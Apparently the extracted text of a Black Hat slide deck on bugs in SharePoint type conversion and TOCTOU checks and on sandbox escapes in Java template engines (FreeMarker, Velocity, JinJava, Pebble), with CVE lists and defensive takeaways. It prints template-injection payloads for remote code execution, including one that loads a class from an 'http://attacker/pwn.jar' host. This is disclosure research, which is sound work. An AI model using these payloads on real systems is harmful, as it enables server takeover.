○
TypeConverters
○
Custom converters
●
Where to search:
○
Anywhere text or binary data is converted to an object
○
… and Type/Class of this object is under our control
https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf 
33
4/5 Security problems during conversion 
of values to expected Types
CVE-2020-1460:________________________________________
●
Problem affects a few Microsoft products
●
Microsoft was not able to release fixes for all affected products 
●
Details will be published as soon as the problem is fixed in all products  
●
Result:
○
Arbitrary code execution
34
4/5 Security problems during conversion 
of values to expected Types
●
Target: 
○
Security control/filters bypass via 
TOCTOU
●
Where to search:
○
Anywhere input value can be 
changed AFTER validation 
Input
Security Check
Modification 
Use
Input
Input
35
5/5 Time-of-check to time-of-use problems  
CVE-2020-1444: TOCTOU in WebPartEditingSurface.aspx page   
Details  
●
Input validated by EditingPageParser.VerifyControlOnSafeList() 
●
but after verification, we are able to remove certain substrings:
// Microsoft.SharePoint.Publishing.Internal.CodeBehind.WebPartEditingSurfacePage
internal static Regex tagPrefixRegex = new Regex("", 9);
private static XElement ConvertMarkupToTree(string webPartMarkup)
{...
MatchCollection matchCollection = 
WebPartEditingSurfacePage.tagPrefixRegex.Matches(webPartMarkup);
foreach (Match match in matchCollection)
{
       webPartMarkup = webPartMarkup.Replace(match.Value, "");
...
36
5/5 Time-of-check to time-of-use problems  
CVE-2020-1444: TOCTOU in WebPartEditingSurface.aspx page      
Exploitation 
●
1 comment block for EditingPageParser.VerifyControlOnSafeList():
●
BUT 2 comments + ASPX markup for TemplateControl.ParseControl(content):
>
37
5/5 Time-of-check to time-of-use problems  
CVE-2020-1444: TOCTOU in WebPartEditingSurface.aspx page       
Exploitation 
●
Payload:
●
Result:
○
Arbitrary code execution 
>
 ]]>
38
5/5 Time-of-check to time-of-use problems  
Java Template 
Engines
39
Pebble
JinJava
Velocity
FreeMarker
Khoros
Alfresco
Crafter
Liferay
Ofbiz
XWiki
dotCMS
Cascade
Confluence
HubSpot
Sandboxed 
Java Template Engines
Java CMS-like systems
40
Hello $user.name!
Template Engine
Hello John!
Key
Value
user
acme.User
Context
Template
41
Hello $user.name!
Template Engine
Hello John!
Template
42
Key
Value
user
acme.User
Context
request
response
application
session
...
ServletRequest
ServletResponse
ServletContext
HttpSession
...
Generic Sandbox 
Bypasses
43
Context Inspection
●
Access to Runtime?
○
Debug
○
Instrumentation
●
Otherwise
○
Documentation | name guessing
○
List context objects 
Indirect Objects
●
javax.servlet.http.HttpSession.getAttributeNames()
○
$session | $request.session
●
javax.servlet.http.ServletRequest.getAttributeNames()
○
$req | $request | $session.request
●
javax.servlet.ServletContext.getAttributeNames()
○
$application | $request.servletContext | $session.servletContext
44
Object Dumpster 
Diving 
DEMO
46
Where
●
java.lang.Class.getClassLoader()
●
java.lang.Thread.getCurrentClassLoader()
●
java.lang.ProtectionDomain.getClassLoader()
●
javax.servlet.ServletContext.getClassLoader()
●
org.osgi.framework.wiring.BundleWiring.getClassLoader()
●
org.springframework.context.ApplicationContext.getClassLoader()
What
●
Arbitrary Class and Classpath Resource access
●
Arbitrary Local file disclosure through java.net.URL access
#1 ClassLoaders
10/10
47
Web Application ClassLoaders
Tomcat
org.apache.catalina.loader.WebappClassLoader
Jetty
org.eclipse.jetty.webapp.WebAppClassLoader
GlassFish
org.glassfish.web.loader.WebappClassLoader
WildFly (JBoss)
org.jboss.modules.ModuleClassLoader
WebSphere
com.ibm.ws.classloader.CompoundClassLoader
WebLogic
weblogic.utils.classloaders.ChangeAwareClassLoader
9/10
48
Remote Code Execution Vectors on Web Application ClassLoaders:
●
WebShell upload
○
getResources().write(⋯) Tomcat
●
Arbitrary object instantiation
○
getResources().getContext().getInstanceManager() Tomcat
○
getContext().getObjectFactory() Jetty
●
JNDI lookup
○
getResources().lookup(⋯) GlassFish
●
Attacker-controlled static class initializer
○
defineCodeGenClass(⋯) Weblogic
●
Attacker-controlled static class initializer (FreeMarker & Pebble only)
○
newInstance(“http://attacker/pwn.jar”).loadClass(“Pwner”).getField(“PWN”).get(null) 
■
Tomcat, Jetty, GlassFish … or any java.net.URLClassLoader 
○
defineApplicationClass(⋯).getField(⋯).get(null) WebSphere 
9/10
49
Where
●
ServletContext attributes on Tomcat, Jetty, WildFly (JBoss)
●
org.apache.catalina.InstanceManager
●
org.wildfly.extension.undertow.deployment.UndertowJSPInstanceManager
●
org.eclipse.jetty.util.DecoratedObjectFactory
●
WebApp Classloaders
○
Tomcat
○
Jetty
What
●
Arbitrary Object Instantiation ➔ RCE. Eg:
#2 InstanceManager / ObjectFactory
${im.newInstance('javax.script.ScriptEngineManager').getEngineByName('js').eval('CODE')}
$request.servletContext.classLoader.resources.context.instanceManager
$request.servletContext.classLoader.context.objectFactory
9/10
50
Where
●
ServletContext attribute
○
org.springframework.web.context.WebApplicationContext.ROOT
●
Spring Macro Request Context
○
Injected by Spring MVC automatically (normally undocumented in CMS)
○
$springMacroRequestContext.getWebApplicationContext()
What
●
getClassLoader()
●
getEnvironment()
●
getBean()
○
Control application logic
○
Disable sandboxes
○
Instantiate arbitrary objects
#3 Spring Application Context
4/10
51
●
com.fasterxml.jackson.databind.ObjectMapper
●
org.springframework.web.context.support.ServletContextScope
●
org.springframework.web.servlet.support.RequestContext
●
org.apache.felix.framework.BundleContextImpl
●
org.eclipse.osgi.internal.framework.BundleContextImpl
●
com.liferay.portal.kernel.json.JSONFactoryUtil
●
freemarker.ext.beans.BeansWrapper.getStaticModels
●
com.opensymphony.xwork2.ognl.OgnlUtil
●
com.opensymphony.xwork2.ognl.OgnlValueStack
●
com.opensymphony.xwork.DefaultActionInvocation
●
com.opensymphony.webwork.util.VelocityWebWorkUtil
●
com.thoughtworks.xstream.XStream
●
org.apache.camel.CamelContext
●
...
Other Interesting Objects
52
Specific Sandbox 
Bypasses
53
Previous Research
●
James Kettle (PortSwigger) 2015
○
?new() built-in (default configuration)
○
https://portswigger.net/research/server-side-template-injection
●
Toni Torralba (Ackcent) 2019
○
Arbitrary object instantiation 
○
Depends on non-default built-in and 3rd party library
○
https://ackcent.com/blog/in-depth-freemarker-template-injection/
●
Ryan Hanson (Atredis Partners) March 2020
○
RCE vía File Write on Tomcat server
○
https://github.com/atredispartners/advisories/blob/master/ATREDIS-2019-0006.md
FreeMarker Sandbox
${"freemarker.template.utility.Execute"?new()("id")}
FreeMarker
54
Sandbox is based on method blocklist
●
Example java.lang.Class.getClassLoader is blocked
○
class.protectionDomain.classLoader
○
servletContext.classLoader
○
...
●
ClassLoader methods are allowed
○
loadClass()
○
getResource()
○
...
●
Reflective access to public fields is allowed
○
Setting values is forbidden but ..
○
Reading them is ok
FreeMarker
55
http://attack.er
RCE on FreeMarker + URLClassLoader (Tomcat, GlassFish, Jetty …)
FreeMarker
pwn.jar
public class Pwn {
static {  }
public static String PWN = "FOO";
}
56
CodeQL Gadget Query
CodeQL lets you query and reason about code:
Find me public static fields that can instantiate arbitrary types!
FreeMarker
57
FreeMarker
58
RCE on FreeMarker
Fixed in 2.30 which introduces a new sandbox based on MemberAccessPolicy. 
Default policy improves the blocklist and forbids access to ClassLoader methods and public 
fields through reflection. Legacy policy is still vulnerable
${dwf.newInstance(ec,null)("")}
FreeMarker
59
If Spring Beans are accessible, we can normally disable the sandbox: 
${"freemarker.template.utility.Execute"?new()("id")}
FreeMarker
60
8 different ways to 
escape the Sandbox
DEMO
Class & Package-based Blocklist
Velocity Sandbox
introspector.restrict.packages = java.lang.reflect
introspector.restrict.classes = java.lang.Class
introspector.restrict.classes = java.lang.ClassLoader
introspector.restrict.classes = java.lang.Compiler
introspector.restrict.classes = java.lang.InheritableThreadLocal
introspector.restrict.classes = java.lang.Package
introspector.restrict.classes = java.lang.Process
introspector.restrict.classes = java.lang.Runtime
introspector.restrict.classes = java.lang.RuntimePermission
introspector.restrict.classes = java.lang.SecurityManager
introspector.restrict.classes = java.lang.System
introspector.restrict.classes = java.lang.Thread
introspector.restrict.classes = java.lang.ThreadGroup
introspector.restrict.classes = java.lang.ThreadLocal
...
Velocity
62
Blocklist checks are performed on current object class rather than inspecting the class 
hierarchy. eg:
Velocity
${request.servletContext.classLoader.loadClass("CLASS")}
Fixed in version 2.3
63
Blocklist checks are performed on current object class rather than inspecting the class 
hierarchy. eg:
Velocity
$request.servletContext.classLoader.loadClass("CLASS").()
Fixed in version 2.3
64
Method-based blocklist
JinJava Sandbox
Forbids any methods returning a java.lang.Class
However, it is still possible to invoke methods that return java.lang.Class arrays or maps
RESTRICTED_METHODS = builder()
   .add("clone")
   .add("hashCode")
   .add("getClass")
   .add("getDeclaringClass")
   .add("forName")
   .add("notify")
   .add("notifyAll")
   .add("wait").build();
…
result = super.invoke(..., method, ...);
if (result instanceof Class) {
    throw new MethodNotFoundException();
}
…
JinJava
65
“Secret” keyword to access the underlying interpreter/engine:
We can use the int3rpr3t3r to access:
●
all context objects
●
exposed functions
●
exposed filters
JinJava
66
We can access java.lang.Class instances via:
java.lang.reflect.Method.getParameterTypes()  ➔ java.lang.Class[]
{% set ctx = ____int3rpr3t3r____.getContext() %}
{% set a_class = ctx.getAllFunctions().toArray()[0].getMethod().getParameterTypes()[0] %}
{% set cl = a_class.getProtectionDomain().getClassLoader() %}
Fixed in 2.5.4 (CVE-2020-12668)
JinJava
67
68
Pebble Sandbox
Conclusions
69
Results: 
●
30+ new vulnerabilities
○
CVE-2020-0971, CVE-2020-0974, CVE-2020-1069, CVE-2020-1103, CVE-2020-1460, 
CVE-2020-1147, CVE-2020-1444, CVE-2020-1961, CVE-2020-4027, CVE-2020-5245, 
CVE-2020-9296, CVE-2020-9297, CVE-2020-9496, CVE-2020-10199, CVE-2020-10204, 
CVE-2020-11002, CVE-2020-11994,CVE-2020-12668, CVE-2020-12873, CVE-2020-13445 …
●
20+ affected products 
70
Conclusions
#BHUSA   @BLACKHATEVENTS 
●
CMS should be on Red Teams radars
●
Template for dynamic content could be a 
direct path to RCE for attackers
●
Perform security reviews and reduce 
attack surface as much as possible
71
Takeaways
Thanks!
@pwntester
@OlekMirosh
72